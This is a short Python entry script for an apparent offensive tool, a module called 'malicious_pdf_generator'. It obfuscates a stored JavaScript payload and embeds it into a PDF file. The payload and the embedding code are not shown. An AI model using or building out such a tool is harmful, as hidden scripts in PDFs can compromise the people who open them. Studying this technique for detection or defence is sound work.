from malicious_pdf_generator import embedded_javascript_into_pdf, obfuscated_code, const

if __name__ == "__main__":
    obfuscated_code = obfuscated_code(const.JS_CODE)
    embedded_javascript_into_pdf(obfuscated_code, const.input_pdf, const.output_pdf)
    print(f"JavaScript code embedded into {const.output_pdf}.")
